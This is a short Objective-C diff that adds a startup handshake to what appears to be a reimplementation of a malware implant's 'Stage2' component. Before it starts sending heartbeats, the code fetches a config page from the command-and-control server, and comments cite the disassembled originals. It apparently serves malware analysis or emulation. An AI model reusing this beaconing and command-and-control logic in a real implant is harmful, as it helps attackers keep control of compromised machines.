@@ -168,6 +168,17 @@ static void *PLHeartbeatReceiverLoop(void *arg) {
     return NULL;
 }
 
+/* Startup handshake: GET config endpoint once (real Stage2 fetches
+ * show.html / config before heartbeat POSTs). Response is ignored --
+ * the C2 returns a plain 200, no decryption needed. */
+static void PLStartupHandshake(void) {
+    NSString *url = [kBaseURL stringByAppendingString:@"/details/show.html"];
+    NSInteger status = 0;
+    NSData *resp = PLHTTPRequest(url, @"GET", nil, nil, &status);
+    NSLog(@"[stage2] GET show.html: status=%ld len=%zu",
+          (long)status, resp.length);
+}
+
 /* Sender thread: FUN_00081af4 + outer payload-manager retry loop.
  * Success -> 10s cadence. Failure -> exponential backoff
  * 5 * 2^attempt seconds, capped at 120s, then next attempt. */
@@ -175,6 +186,7 @@ static void *PLHeartbeatSenderLoop(void *arg) {
     @autoreleasepool {
         PLSetThreadName("plasma_core_heartbeat_sender");
         NSLog(@"[stage2] heartbeat sender started");
+        PLStartupHandshake();
         uint32_t attempt = 0;
         while (!gStop) {
             NSInteger status = PLSendHeartbeat();
